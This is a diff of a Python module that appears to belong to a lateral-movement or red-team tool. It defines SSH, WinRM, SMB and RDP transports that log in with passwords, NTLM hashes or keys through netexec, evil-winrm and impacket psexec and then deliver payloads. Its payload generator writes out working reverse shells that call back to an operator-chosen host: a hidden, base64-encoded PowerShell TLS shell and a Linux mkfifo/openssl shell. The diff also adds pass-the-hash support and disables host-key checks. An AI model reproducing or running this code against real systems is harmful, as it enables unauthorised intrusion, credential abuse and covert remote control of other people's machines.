@@ -20,15 +20,14 @@ class RemoteTransportError(Exception):
     """Base exception for remote transport errors."""
     pass
 
-
 class RemoteTransport(ABC):
-    """Abstract interface for remote protocol transports using command-line tools."""
-
     DEFAULT_PORTS = {
         'ssh': 22,
         'winrm': 5985,
         'smb': 445,
         'rdp': 3389,
+        'wmi': 135,
+        'mssql': 1433,
     }
 
     SUPPORTED_OS = {
@@ -36,6 +35,8 @@ class RemoteTransport(ABC):
         'winrm': ['windows'],
         'smb': ['windows', 'linux'],
         'rdp': ['windows', 'linux'],
+        'wmi': ['windows'],
+        'mssql': ['windows'],
     }
 
     def __init__(self):
@@ -48,6 +49,10 @@ class RemoteTransport(ABC):
         self._password = None
         self._callback_host = None
         self._callback_port = None
+        self._port = None
+        self._ntlm_hash = None
+        self._private_key = None
+        self._use_nxc = False
 
     @abstractmethod
     def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
@@ -78,18 +83,12 @@ class RemoteTransport(ABC):
         return self._platform
 
     def _perform_platform_detection(self) -> str:
-        """Internal platform detection. Override in subclasses."""
         return "unknown"
 
     def _check_command(self, command: str) -> bool:
-        """Check if a command-line tool is available."""
         return shutil.which(command) is not None
 
     def _run_command(self, cmd: list, timeout: int = 30) -> Tuple[bool, str, str]:
-        """
-        Run a command and return success status, stdout, and stderr.
-        Returns: (success, stdout, stderr)
-        """
         try:
             result = subprocess.run(
                 cmd,
@@ -107,40 +106,38 @@ class RemoteTransport(ABC):
             return False, "", str(e)
 
     def _generate_payload(self, target_os: str, callback_host: str, callback_port: int) -> str:
-        """Generate a reverse shell payload that runs in the background."""
         if target_os == 'windows':
-            # PowerShell TLS reverse shell, wrapped to run in background
-            ps_cmd = (
-                f"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; "
+            ps_script = (
                 f"$TCPClient = New-Object Net.Sockets.TCPClient('{callback_host}', {callback_port});"
                 f"$NetworkStream = $TCPClient.GetStream();"
-                f"$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));"
-                f"$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);"
-                f"if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}"
+                f"$SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));"
+                f"$SslStream.AuthenticateAsClient('cloudflare-dns.com');"
                 f"$StreamWriter = New-Object IO.StreamWriter($SslStream);"
-                f"function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;"
-                f"$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};"
+                f"function WriteToStream ($String) {{$StreamWriter.Write($String + 'SHELL> '); $StreamWriter.Flush()}};"
                 f"WriteToStream '';"
-                f"while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{"
-                f"$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
-                f"$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}"
-                f"WriteToStream ($Output)}}"
+                f"while (($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{"
+                f"    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
+                f"    try {{ $Output = Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $Output = $_ | Out-String }}"
+                f"    WriteToStream $Output"
+                f"}};"
                 f"$StreamWriter.Close()"
             )
-            # Use Start-Process to run in background, hidden
-            return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Start-Process -WindowStyle Hidden -NoNewWindow -FilePath powershell -ArgumentList \'-NoP -NonI -W Hidden -Exec Bypass -Command "{ps_cmd}"\'"'
+            import base64
+            encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
+            return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Start-Process -WindowStyle Hidden -NoNewWindow -FilePath powershell -ArgumentList \'-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}\'"'
         else:
-            # Linux OpenSSL reverse shell with nohup and & to detach
             return f'nohup sh -c "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {callback_host}:{callback_port} > /tmp/s; rm /tmp/s" >/dev/null 2>&1 &'
+
+    def _get_os_specific_command(self, cmd_dict: Dict[str, str], target_os: str) -> Optional[str]:
+        return cmd_dict.get(target_os)
 
 
 class SSHTransport(RemoteTransport):
-    """SSH protocol transport supporting both Windows and Linux targets."""
-
     def __init__(self):
         super().__init__()
         self._ssh_command = None
         self._sshpass_available = False
+        self._use_sshpass = False
 
     def _ensure_dependency(self):
         if self._ssh_command is None:
@@ -152,6 +149,28 @@ class SSHTransport(RemoteTransport):
                     "Install it with your system package manager (e.g., apt install openssh-client)"
                 )
         self._sshpass_available = self._check_command('sshpass')
+
+    def _build_ssh_cmd(self, command: str, background: bool = False,
+                       with_batch: Optional[bool] = None) -> List[str]:
+        base = [self._ssh_command]
+        base.extend(['-o', 'StrictHostKeyChecking=no'])
+        base.extend(['-o', 'ConnectTimeout=10'])
+        if with_batch is None:
+            with_batch = not self._use_sshpass
+        if with_batch:
+            base.extend(['-o', 'BatchMode=yes'])
+        if self._use_sshpass and self._password:
+            base.extend(['-o', 'PasswordAuthentication=yes'])
+        base.extend(['-p', str(self._port)])
+        if self._private_key:
+            base.extend(['-i', self._private_key])
+        if background:
+            base.append('-f')
+        base.append(f"{self._username}@{self._host}")
+        base.append(command)
+        if self._use_sshpass and self._password:
+            return ['sshpass', '-p', self._password] + base
+        return base
 
     def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
         self._ensure_dependency()
@@ -168,50 +187,38 @@ class SSHTransport(RemoteTransport):
         self._target_os = target_os
         self._callback_host = callback_host
         self._callback_port = callback_port
+        self._port = port
+        self._private_key = private_key_path
+        self._use_nxc = use_nxc
 
         if use_nxc:
             return self._connect_nxc(host, username, password, private_key_path, port)
 
-        try:
-            cmd = [
-                self._ssh_command,
-                '-o', 'StrictHostKeyChecking=no',
-                '-o', 'ConnectTimeout=10',
-                '-o', 'BatchMode=yes',
-                '-p', str(port),
-            ]
+        if private_key_path:
+            if not os.path.exists(private_key_path):
+                raise RemoteTransportError(f"Private key file not found: {private_key_path}")
+            if not os.access(private_key_path, os.R_OK):
+                raise RemoteTransportError(f"Private key file not readable: {private_key_path}")
+            self._use_sshpass = False
+        elif password:
+            if not self._sshpass_available:
+                raise RemoteTransportError(
+                    "Password authentication requires 'sshpass' command-line tool. "
+                    "Install it with: apt install sshpass (or use private key authentication)"
+                )
+            self._use_sshpass = True
+        else:
+            raise RemoteTransportError("SSH requires either password or private key")
 
-            if private_key_path:
-                if not os.path.exists(private_key_path):
-                    raise RemoteTransportError(f"Private key file not found: {private_key_path}")
-                if not os.access(private_key_path, os.R_OK):
-                    raise RemoteTransportError(f"Private key file not readable: {private_key_path}")
-                cmd.extend(['-i', private_key_path])
-            elif password:
-                if not self._sshpass_available:
-                    raise RemoteTransportError(
-                        "Password authentication requires 'sshpass' command-line tool. "
-                        "Install it with: apt install sshpass (or use private key authentication)"
-                    )
-                cmd = ['sshpass', '-p', password] + cmd
-            else:
-                raise RemoteTransportError("SSH requires either password or private key")
+        cmd = self._build_ssh_cmd("echo SSH_CONNECTION_SUCCESS", with_batch=False)
+        success, stdout, stderr = self._run_command(cmd, timeout=15)
 
-            cmd.extend([f"{username}@{host}", "echo", "SSH_CONNECTION_SUCCESS"])
-
-            success, stdout, stderr = self._run_command(cmd, timeout=15)
-
-            if success and 'SSH_CONNECTION_SUCCESS' in stdout:
-                self.connected = True
-                return True
-            else:
-                error_msg = stderr.strip() if stderr else stdout.strip()
-                raise RemoteTransportError(f"SSH connection test failed: {error_msg}")
-
-        except RemoteTransportError:
-            raise
-        except Exception as e:
-            raise RemoteTransportError(f"SSH connection failed: {e}")
+        if success and 'SSH_CONNECTION_SUCCESS' in stdout:
+            self.connected = True
+            return True
+        else:
+            error_msg = stderr.strip() if stderr else stdout.strip()
+            raise RemoteTransportError(f"SSH connection test failed: {error_msg}")
 
     def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                      private_key_path: Optional[str] = None, port: int = 22) -> bool:
@@ -220,15 +227,15 @@ class SSHTransport(RemoteTransport):
 
         try:
             cmd = ['netexec', 'ssh', host, '-u', username]
-            if port != self.DEFAULT_PORTS['ssh']:
+            if port is not None and port != self.DEFAULT_PORTS['ssh']:
                 cmd.extend(['--port', str(port)])
             if password:
                 cmd.extend(['-p', password])
             elif private_key_path:
-                raise RemoteTransportError("netexec SSH only supports password authentication")
+                cmd.extend(['-i', private_key_path])
             else:
-                raise RemoteTransportError("Password required for netexec SSH")
-
+                raise RemoteTransportError("Password or private key required for netexec SSH")
+            cmd.extend(['-x', 'exit'])
             success, stdout, stderr = self._run_command(cmd, timeout=30)
             output = stdout + stderr
             if success or 'authenticated' in output.lower():
@@ -237,7 +244,6 @@ class SSHTransport(RemoteTransport):
             else:
                 error_msg = stderr.strip() or stdout.strip() or "Unknown error"
                 raise RemoteTransportError(f"netexec SSH connection failed: {error_msg}")
-
         except RemoteTransportError:
             raise
         except Exception as e:
@@ -254,20 +260,29 @@ class SSHTransport(RemoteTransport):
             if command is None:
                 return False, f"No command found for OS: {target_os}"
 
-        # For SSH, we can use -f to fork into background if background=True
-        try:
-            cmd = [
-                self._ssh_command,
-                '-o', 'StrictHostKeyChecking=no',
-                '-o', 'ConnectTimeout=10',
-                '-o', 'BatchMode=yes',
-            ]
-            if background:
-                cmd.append('-f')  # Fork into background after authentication
-            cmd.append(f"{self._username}@{self._host}")
-            cmd.append(command)
+        if self._use_nxc:
+            try:
+                cmd = ['netexec', 'ssh', self._host, '-u', self._username]
+                if self._password:
+                    cmd.extend(['-p', self._password])
+                elif self._private_key:
+                    cmd.extend(['-i', self._private_key])
+                else:
+                    return False, "No authentication available for netexec SSH"
+                if self._port is not None and self._port != self.DEFAULT_PORTS['ssh']:
+                    cmd.extend(['--port', str(self._port)])
+                cmd.extend(['-x', command])
+                timeout = 10 if background else 60
+                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+                if success:
+                    return True, stdout
+                else:
+                    return False, stderr
+            except Exception as e:
+                return False, str(e)
 
-            # If background, we set a shorter timeout because the command returns immediately
+        try:
+            cmd = self._build_ssh_cmd(command, background=background)
             timeout = 10 if background else 60
             success, stdout, stderr = self._run_command(cmd, timeout=timeout)
             if success:
@@ -278,72 +293,107 @@ class SSHTransport(RemoteTransport):
             return False, str(e)
 
     def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
-        # Payload already includes background execution; we just pass it
         return self.execute_command(payload, target_os, background=True)
 
     def close(self):
         self.connected = False
         self._host = self._username = self._password = self._target_os = None
+        self._port = None
 
     def _perform_platform_detection(self) -> str:
         if not self.connected:
             return "unknown"
-        try:
-            success, stdout, _ = self._run_command(
-                ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ConnectTimeout=5',
-                 f"{self._username}@{self._host}", 'uname -s 2>/dev/null || echo Windows'],
-                timeout=10
-            )
-            if success:
-                if 'Linux' in stdout or 'Darwin' in stdout:
-                    return "linux"
-                elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
+        if self._use_nxc:
+            try:
+                cmd = ['netexec', 'ssh', self._host, '-u', self._username]
+                if self._password:
+                    cmd.extend(['-p', self._password])
+                elif self._private_key:
+                    cmd.extend(['-i', self._private_key])
+                else:
+                    return "unknown"
+                if self._port is not None and self._port != self.DEFAULT_PORTS['ssh']:
+                    cmd.extend(['--port', str(self._port)])
+                cmd.extend(['-x', 'uname -s 2>/dev/null || echo Windows'])
+                success, stdout, _ = self._run_command(cmd, timeout=10)
+                if success:
+                    if 'Linux' in stdout or 'Darwin' in stdout:
+                        return "linux"
+                    elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
+                        return "windows"
+                cmd[-1] = 'ver 2>nul || echo Linux'
+                success, stdout, _ = self._run_command(cmd, timeout=10)
+                if success and ('Microsoft' in stdout or 'Windows' in stdout):
                     return "windows"
-            success, stdout, _ = self._run_command(
-                ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ConnectTimeout=5',
-                 f"{self._username}@{self._host}", 'ver 2>nul || echo Linux'],
-                timeout=10
-            )
-            if success and ('Microsoft' in stdout or 'Windows' in stdout):
-                return "windows"
-            return "linux"
-        except Exception:
-            return "unknown"
+                return "linux"
+            except Exception:
+                return "unknown"
+        else:
+            try:
+                cmd = self._build_ssh_cmd('uname -s 2>/dev/null || echo Windows', with_batch=False)
+                success, stdout, _ = self._run_command(cmd, timeout=10)
+                if success:
+                    if 'Linux' in stdout or 'Darwin' in stdout:
+                        return "linux"
+                    elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
+                        return "windows"
+                cmd = self._build_ssh_cmd('ver 2>nul || echo Linux', with_batch=False)
+                success, stdout, _ = self._run_command(cmd, timeout=10)
+                if success and ('Microsoft' in stdout or 'Windows' in stdout):
+                    return "windows"
+                return "linux"
+            except Exception:
+                return "unknown"
 
 
 class WinRMTransport(RemoteTransport):
     def __init__(self):
         super().__init__()
+        self._evil_winrm_available = False
+        self._netexec_available = False
 
     def _ensure_dependency(self):
-        if not self._check_command('netexec'):
+        self._evil_winrm_available = self._check_command('evil-winrm')
+        self._netexec_available = self._check_command('netexec')
+        if not (self._evil_winrm_available or self._netexec_available):
             raise RemoteTransportError(
-                "WinRM transport requires 'netexec'. Install: pip install netexec"
+                "WinRM requires either 'evil-winrm' or 'netexec'. "
+                "Install evil-winrm: gem install evil-winrm, or netexec: pip install netexec"
             )
 
-    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
-        self._ensure_dependency()
-        if kwargs.get('private_key'):
-            raise RemoteTransportError("WinRM does not support private key authentication")
-        if not password:
-            raise RemoteTransportError("Password required for WinRM")
-        port = kwargs.get('port', self.DEFAULT_PORTS['winrm'])
-        self._host = host
-        self._username = username
-        self._password = password
-        self._target_os = kwargs.get('target_os', 'windows')
-        self._callback_host = kwargs.get('callback_host')
-        self._callback_port = kwargs.get('callback_port')
-        return self._connect_nxc(host, username, password, port)
+    def _connect_evilwinrm(self, host: str, username: str, password: Optional[str] = None,
+                           ntlm_hash: Optional[str] = None, port: int = 5985) -> bool:
+        cmd = ['evil-winrm', '-i', host, '-u', username]
+        if ntlm_hash:
+            cmd.extend(['-H', ntlm_hash])
+        elif password:
+            cmd.extend(['-p', password])
+        else:
+            raise RemoteTransportError("Password or NTLM hash required for evil-winrm")
+        if port is not None and port != self.DEFAULT_PORTS['winrm']:
+            cmd.extend(['-P', str(port)])
+        cmd.extend(['-c', 'echo EVILWINRM_CONNECTION_SUCCESS'])
+        success, stdout, stderr = self._run_command(cmd, timeout=20)
+        if success and 'EVILWINRM_CONNECTION_SUCCESS' in stdout:
+            return True
+        else:
+            error_msg = stderr.strip() or stdout.strip() or "Unknown error"
+            raise RemoteTransportError(f"evil-winrm connection failed: {error_msg}")
 
-    def _connect_nxc(self, host: str, username: str, password: str, port: int = 5985) -> bool:
+    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
+                     ntlm_hash: Optional[str] = None, port: int = 5985) -> bool:
         try:
-            cmd = ['netexec', 'winrm', host, '-u', username, '-p', password]
-            if port != self.DEFAULT_PORTS['winrm']:
+            cmd = ['netexec', 'winrm', host, '-u', username]
+            if port is not None and port != self.DEFAULT_PORTS['winrm']:
                 cmd.extend(['--port', str(port)])
+            if ntlm_hash:
+                cmd.extend(['-H', ntlm_hash])
+            elif password:
+                cmd.extend(['-p', password])
+            else:
+                raise RemoteTransportError("Password or NTLM hash required")
             success, stdout, stderr = self._run_command(cmd, timeout=30)
             if success:
-                self.connected = True
                 return True
             else:
                 raise RemoteTransportError(f"netexec WinRM connection failed: {stderr.strip()}")
@@ -351,6 +401,58 @@ class WinRMTransport(RemoteTransport):
             raise
         except Exception as e:
             raise RemoteTransportError(f"netexec WinRM connection failed: {e}")
+
+    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
+        self._ensure_dependency()
+        if kwargs.get('private_key'):
+            raise RemoteTransportError("WinRM does not support private key authentication")
+        ntlm_hash = kwargs.get('ntlm_hash')
+        use_nxc = kwargs.get('use_nxc', False)
+        port = kwargs.get('port', self.DEFAULT_PORTS['winrm'])
+        target_os = kwargs.get('target_os', 'windows')
+        callback_host = kwargs.get('callback_host')
+        callback_port = kwargs.get('callback_port')
+
+        self._host = host
+        self._username = username
+        self._password = password
+        self._ntlm_hash = ntlm_hash
+        self._target_os = target_os
+        self._callback_host = callback_host
+        self._callback_port = callback_port
+        self._port = port
+        self._use_nxc = use_nxc
+
+        if not use_nxc and self._evil_winrm_available:
+            connected = self._connect_evilwinrm(host, username, password, ntlm_hash, port)
+        else:
+            if not self._netexec_available:
+                raise RemoteTransportError("netexec not available for WinRM")
+            connected = self._connect_nxc(host, username, password, ntlm_hash, port)
+
+        if connected:
+            self.connected = True
+            return True
+        else:
+            return False
+
+    def _execute_evilwinrm_command(self, command: str, background: bool = False) -> Tuple[bool, str]:
+        cmd = ['evil-winrm', '-i', self._host, '-u', self._username]
+        if self._ntlm_hash:
+            cmd.extend(['-H', self._ntlm_hash])
+        elif self._password:
+            cmd.extend(['-p', self._password])
+        else:
+            return False, "No authentication available for evil-winrm"
+        if self._port is not None and self._port != self.DEFAULT_PORTS['winrm']:
+            cmd.extend(['-P', str(self._port)])
+        cmd.extend(['-c', command])
+        timeout = 10 if background else 60
+        success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+        if success:
+            return True, stdout
+        else:
+            return False, stderr or stdout
 
     def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                         background: bool = False) -> Tuple[bool, str]:
@@ -363,23 +465,32 @@ class WinRMTransport(RemoteTransport):
             command = self._get_os_specific_command(command, target_os)
             if command is None:
                 return False, f"No command found for OS: {target_os}"
-        try:
-            # netexec -x executes commands; for background, we rely on the command itself to detach
-            cmd = [
-                'netexec', 'winrm', self._host,
-                '-u', self._username,
-                '-p', self._password,
-                '-x', command
-            ]
-            # If background, we set a shorter timeout because the command should return quickly
-            timeout = 10 if background else 60
-            success, stdout, stderr = self._run_command(cmd, timeout=timeout)
-            if success:
-                return True, stdout
-            else:
-                return False, stderr
-        except Exception as e:
-            return False, str(e)
+
+        if not self._use_nxc and self._evil_winrm_available:
+            return self._execute_evilwinrm_command(command, background)
+        else:
+            try:
+                cmd = [
+                    'netexec', 'winrm', self._host,
+                    '-u', self._username,
+                    '-x', command
+                ]
+                if self._ntlm_hash:
+                    cmd.extend(['-H', self._ntlm_hash])
+                elif self._password:
+                    cmd.extend(['-p', self._password])
+                else:
+                    return False, "No authentication available for netexec WinRM"
+                if self._port is not None and self._port != self.DEFAULT_PORTS['winrm']:
+                    cmd.extend(['--port', str(self._port)])
+                timeout = 10 if background else 60
+                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+                if success:
+                    return True, stdout
+                else:
+                    return False, stderr
+            except Exception as e:
+                return False, str(e)
 
     def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
         return self.execute_command(payload, target_os, background=True)
@@ -387,6 +498,8 @@ class WinRMTransport(RemoteTransport):
     def close(self):
         self.connected = False
         self._host = self._username = self._password = self._target_os = None
+        self._port = None
+        self._ntlm_hash = None
 
     def _perform_platform_detection(self) -> str:
         return "windows"
@@ -395,21 +508,23 @@ class WinRMTransport(RemoteTransport):
 class SMBTransport(RemoteTransport):
     def __init__(self):
         super().__init__()
+        self._psexec_cmd = None
         self._netexec_available = False
-        self._impacket_available = False
-        self._smbclient_available = False
 
     def _ensure_dependency(self):
+        if self._check_command('psexec.py'):
+            self._psexec_cmd = 'psexec.py'
+        elif self._check_command('impacket-psexec'):
+            self._psexec_cmd = 'impacket-psexec'
+        else:
+            self._psexec_cmd = None
+
         self._netexec_available = self._check_command('netexec')
-        self._smbclient_available = self._check_command('smbclient')
-        self._impacket_available = (
-            self._check_command('psexec.py') or
-            self._check_command('wmiexec.py') or
-            self._check_command('smbexec.py')
-        )
-        if not (self._netexec_available or self._impacket_available):
+
+        if not (self._psexec_cmd or self._netexec_available):
             raise RemoteTransportError(
-                "SMB requires 'netexec' or impacket tools. Install netexec: pip install netexec"
+                "SMB requires either 'psexec.py' (or 'impacket-psexec') from impacket, or 'netexec'. "
+                "Install impacket: pip install impacket, or netexec: pip install netexec"
             )
 
     def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
@@ -419,27 +534,61 @@ class SMBTransport(RemoteTransport):
         ntlm_hash = kwargs.get('ntlm_hash')
         use_nxc = kwargs.get('use_nxc', False)
         port = kwargs.get('port', self.DEFAULT_PORTS['smb'])
+        target_os = kwargs.get('target_os', 'windows')
+
         if not password and not ntlm_hash:
             raise RemoteTransportError("Password or NTLM hash required for SMB")
+
+        if target_os == 'linux' and not use_nxc:
+            raise RemoteTransportError(
+                "SMB to Linux targets requires --nxc (netexec), because psexec only supports Windows"
+            )
+        if use_nxc and not self._netexec_available:
+            raise RemoteTransportError("--nxc requested but netexec is not installed")
+
         self._host = host
         self._username = username
         self._password = password
-        self._target_os = kwargs.get('target_os')
+        self._ntlm_hash = ntlm_hash
+        self._target_os = target_os
         self._callback_host = kwargs.get('callback_host')
         self._callback_port = kwargs.get('callback_port')
+        self._port = port
+        self._use_nxc = use_nxc
 
-        if use_nxc or not self._impacket_available:
-            if not self._netexec_available:
-                raise RemoteTransportError("netexec not available")
+        if self._use_nxc:
             return self._connect_nxc(host, username, password, ntlm_hash, port)
         else:
-            return self._connect_impacket(host, username, password, ntlm_hash, port)
+            if not self._psexec_cmd:
+                raise RemoteTransportError("No psexec command found (tried psexec.py and impacket-psexec)")
+            return self._connect_psexec(host, username, password, ntlm_hash, port)
+
+    def _connect_psexec(self, host: str, username: str, password: Optional[str] = None,
+                        ntlm_hash: Optional[str] = None, port: int = 445) -> bool:
+        host_spec = f"{host}:{port}" if (port is not None and port != self.DEFAULT_PORTS['smb']) else host
+        try:
+            if password:
+                cmd = [self._psexec_cmd, f'{username}:{password}@{host_spec}', 'cmd.exe', '/c', 'exit']
+            elif ntlm_hash:
+                cmd = [self._psexec_cmd, f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', 'cmd.exe', '/c', 'exit']
+            else:
+                raise RemoteTransportError("Password or NTLM hash required")
+            success, stdout, stderr = self._run_command(cmd, timeout=30)
+            if success:
+                self.connected = True
+                return True
+            else:
+                raise RemoteTransportError(f"{self._psexec_cmd} connection failed: {stderr.strip()}")
+        except RemoteTransportError:
+            raise
+        except Exception as e:
+            raise RemoteTransportError(f"{self._psexec_cmd} connection failed: {e}")
 
     def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                      ntlm_hash: Optional[str] = None, port: int = 445) -> bool:
         try:
             cmd = ['netexec', 'smb', host, '-u', username]
-            if port != self.DEFAULT_PORTS['smb']:
+            if port is not None and port != self.DEFAULT_PORTS['smb']:
                 cmd.extend(['--port', str(port)])
             if ntlm_hash:
                 cmd.extend(['-H', ntlm_hash])
@@ -459,41 +608,6 @@ class SMBTransport(RemoteTransport):
         except Exception as e:
             raise RemoteTransportError(f"netexec SMB connection failed: {e}")
 
-    def _connect_impacket(self, host: str, username: str, password: Optional[str] = None,
-                          ntlm_hash: Optional[str] = None, port: int = 445) -> bool:
-        try:
-            if self._check_command('psexec.py'):
-                host_spec = f"{host}:{port}" if port != self.DEFAULT_PORTS['smb'] else host
-                if password:
-                    cmd = ['psexec.py', f'{username}:{password}@{host_spec}', 'cmd.exe', '/c', 'exit']
-                elif ntlm_hash:
-                    cmd = ['psexec.py', f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', 'cmd.exe', '/c', 'exit']
-                else:
-                    raise RemoteTransportError("Password or NTLM hash required")
-                success, _, _ = self._run_command(cmd, timeout=30)
-                if success:
-                    self.connected = True
-                    return True
-            if self._check_command('smbclient'):
-                cmd = ['smbclient', '-L', f'//{host}/']
-                if password:
-                    cmd.extend(['--user', username, '--password', password])
-                elif ntlm_hash:
-                    cmd.extend(['--user', username, '--pw-nt-hash', ntlm_hash])
-                else:
-                    raise RemoteTransportError("Password or NTLM hash required")
-                if port != self.DEFAULT_PORTS['smb']:
-                    cmd.extend(['-p', str(port)])
-                success, _, _ = self._run_command(cmd, timeout=15)
-                if success:
-                    self.connected = True
-                    return True
-            raise RemoteTransportError("All impacket connection attempts failed")
-        except RemoteTransportError:
-            raise
-        except Exception as e:
-            raise RemoteTransportError(f"Impacket SMB connection failed: {e}")
-
     def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                         background: bool = False) -> Tuple[bool, str]:
         if not self.connected:
@@ -503,9 +617,18 @@ class SMBTransport(RemoteTransport):
             command = self._get_os_specific_command(command, target_os)
             if command is None:
                 return False, f"No command found for OS: {target_os}"
-        try:
-            if self._netexec_available:
-                cmd = ['netexec', 'smb', self._host, '-u', self._username, '-p', self._password]
+
+        if self._use_nxc:
+            try:
+                cmd = ['netexec', 'smb', self._host, '-u', self._username]
+                if self._ntlm_hash:
+                    cmd.extend(['-H', self._ntlm_hash])
+                elif self._password:
+                    cmd.extend(['-p', self._password])
+                else:
+                    return False, "No authentication available"
+                if self._port is not None and self._port != self.DEFAULT_PORTS['smb']:
+                    cmd.extend(['--port', str(self._port)])
                 if target_os == 'windows':
                     cmd.extend(['-x', command])
                 else:
@@ -516,23 +639,29 @@ class SMBTransport(RemoteTransport):
                     return True, stdout
                 else:
                     return False, stderr
-            else:
-                if target_os == 'windows':
-                    tool = 'psexec.py' if self._check_command('psexec.py') else 'wmiexec.py'
-                    if self._password:
-                        cmd = [tool, f'{self._username}:{self._password}@{self._host}', command]
-                    else:
-                        return False, "Password required for impacket command execution"
-                    timeout = 10 if background else 60
-                    success, stdout, stderr = self._run_command(cmd, timeout=timeout)
-                    if success:
-                        return True, stdout
-                    else:
-                        return False, stderr
+            except Exception as e:
+                return False, str(e)
+        else:
+            if target_os != 'windows':
+                return False, "psexec only supports Windows targets. Use --nxc for Linux."
+            if not self._psexec_cmd:
+                return False, "No psexec command available"
+            host_spec = f"{self._host}:{self._port}" if (self._port is not None and self._port != self.DEFAULT_PORTS['smb']) else self._host
+            try:
+                if self._password:
+                    cmd = [self._psexec_cmd, f'{self._username}:{self._password}@{host_spec}', command]
+                elif self._ntlm_hash:
+                    cmd = [self._psexec_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', command]
                 else:
-                    return False, "SMB command execution on Linux requires netexec"
-        except Exception as e:
-            return False, str(e)
+                    return False, "No authentication available"
+                timeout = 10 if background else 60
+                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
+                if success:
+                    return True, stdout
+                else:
+                    return False, stderr
+            except Exception as e:
+                return False, str(e)
 
     def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
         return self.execute_command(payload, target_os, background=True)
@@ -540,9 +669,11 @@ class SMBTransport(RemoteTransport):
     def close(self):
         self.connected = False
         self._host = self._username = self._password = self._target_os = None
+        self._port = None
+        self._ntlm_hash = None
 
     def _perform_platform_detection(self) -> str:
-        return "windows"
+        return self._target_os if self._target_os in ('windows', 'linux') else 'windows'
 
 
 class RDPTransport(RemoteTransport):
@@ -553,15 +684,17 @@ class RDPTransport(RemoteTransport):
 
     def _ensure_dependency(self):
         self._netexec_available = self._check_command('netexec')
-        if self._xfreerdp_command is None:
-            if self._check_command('xfreerdp3'):
-                self._xfreerdp_command = 'xfreerdp3'
-            elif self._check_command('xfreerdp'):
-                self._xfreerdp_command = 'xfreerdp'
+        if self._check_command('xfreerdp3'):
+            self._xfreerdp_command = 'xfreerdp3'
+        elif self._check_command('xfreerdp'):
+            self._xfreerdp_command = 'xfreerdp'
+        else:
+            self._xfreerdp_command = None
+
         if not (self._netexec_available or self._xfreerdp_command):
             raise RemoteTransportError(
-                "RDP requires 'netexec' or 'xfreerdp'/'xfreerdp3'. "
-                "Install netexec: pip install netexec, or freerdp: apt install freerdp2-x11"
+                "RDP requires either 'netexec' (for command execution) or 'xfreerdp'/'xfreerdp3'. "
+                "Install netexec: pip install netexec, or freerdp: apt install freerdp3"
             )
 
     def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
@@ -576,11 +709,14 @@ class RDPTransport(RemoteTransport):
         self._host = host
         self._username = username
         self._password = password
+        self._ntlm_hash = ntlm_hash
         self._target_os = kwargs.get('target_os')
         self._callback_host = kwargs.get('callback_host')
         self._callback_port = kwargs.get('callback_port')
+        self._port = port
+        self._use_nxc = use_nxc or not self._xfreerdp_command
 
-        if use_nxc or not self._xfreerdp_command:
+        if self._use_nxc:
             return self._connect_nxc(host, username, password, ntlm_hash, port)
         else:
             return self._connect_xfreerdp(host, username, password, ntlm_hash, port)
@@ -589,7 +725,7 @@ class RDPTransport(RemoteTransport):
                      ntlm_hash: Optional[str] = None, port: int = 3389) -> bool:
         try:
             cmd = ['netexec', 'rdp', host, '-u', username]
-            if port != self.DEFAULT_PORTS['rdp']:
+            if port is not None and port != self.DEFAULT_PORTS['rdp']:
                 cmd.extend(['--port', str(port)])
             if ntlm_hash:
                 cmd.extend(['-H', ntlm_hash])
@@ -616,7 +752,7 @@ class RDPTransport(RemoteTransport):
         if not password:
             raise RemoteTransportError("Password required for xfreerdp")
         try:
-            host_spec = f"{host}:{port}" if port != self.DEFAULT_PORTS['rdp'] else host
